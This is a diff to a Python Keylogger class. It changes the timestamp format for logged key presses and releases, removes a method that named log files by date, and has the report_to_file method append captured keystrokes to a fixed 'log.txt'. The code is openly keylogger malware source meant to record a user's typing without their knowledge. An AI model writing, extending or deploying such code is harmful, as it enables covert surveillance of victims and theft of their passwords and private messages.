@@ -43,29 +43,24 @@ class Keylogger:
                 name = f"[{name.upper()}]"
 
         if eventtype == "up":
-            name = "\n" + now.strftime("%m/%d/%Y, %H:%M:%S") + " Released: " + name
+            name = "\n" + now.strftime("%H:%M:%S") + " Released: " + name
         elif eventtype == "down":
-            name = "\n" + now.strftime("%m/%d/%Y, %H:%M:%S") + " Pressed: " + name
+            name = "\n" + now.strftime("%H:%M:%S") + " Pressed: " + name
 
         # finally, add the key name to our global `self.log` variable
         self.log += name
 
 
-
-    def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
-
     def report_to_file(self):
         """This method creates a log file in the current directory that contains
         the current keylogs in the `self.log` variable"""
+        self.filename = "log"
         # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "w") as f:
-            # write the keylogs to the file
-            print(self.log, file=f)
+        myfile = open(f"{self.filename}.txt", "a")
+        # write the keylogs to the file
+        myfile.write(self.log)
         print(f"[+] Saved {self.filename}.txt")
+    #    myfile.close()
 
 
 
